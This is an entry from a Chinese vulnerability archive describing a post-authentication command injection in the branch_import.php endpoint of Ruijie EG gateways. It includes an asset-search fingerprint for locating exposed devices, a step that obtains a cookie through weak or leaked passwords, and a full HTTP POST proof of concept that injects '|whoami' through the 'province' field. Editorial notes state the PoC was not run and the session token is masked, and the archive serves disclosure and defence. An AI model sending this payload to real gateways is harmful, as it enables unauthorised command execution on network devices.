---
version: "锐捷EG易网关"
source: "wy876 漏洞文库"
id: "vw-f0757219e667584b00569824"
entity_id: "ve-f0757219e667584b00569824"
schema_version: "1"
title: "锐捷 EG易网关branch_import存在后台远程命令执行漏洞"
product: "Ruijie EG易网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "已有后台Cookie，未给版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3branch_import%E5%AD%98%E5%9C%A8%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mdlrafum0t2146rf"
source_status: "recorded"
---

# 锐捷 EG易网关branch_import存在后台远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie EG易网关
- 本文讨论：branch_import.php branch_list province命令注入
- 版本、权限与配置前提：已有后台Cookie，未给版本
- 资料类型：后台PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 简介误写cli，与标题和实际branch_import请求不符
- 只有请求无输出/源码，不应因同模板与cli或branch_passw合并
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- province处理及角色边界待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">锐捷 EG易网关cli存在后台远程命令执行漏洞。  
</font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

```java
锐捷EG易网关
```

<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**

```java
app="Ruijie-EG易网关"
```

<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">●登录页面</font>


# <font style="color:rgb(38, 38, 38);">四、漏洞复现</font>
1. 通过弱口令或账号密码泄露漏洞登录后台获取cookie


2. 通过上一步获取的cookie执行命令

```http
POST /itbox_pi/branch_import.php?a=branch_list HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=ihv********************9f5; helpKey=home_sys;user=admin
X-Requested-With: XMLHttpRequest
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 16

province=|whoami
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mdlrafum0t2146rf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
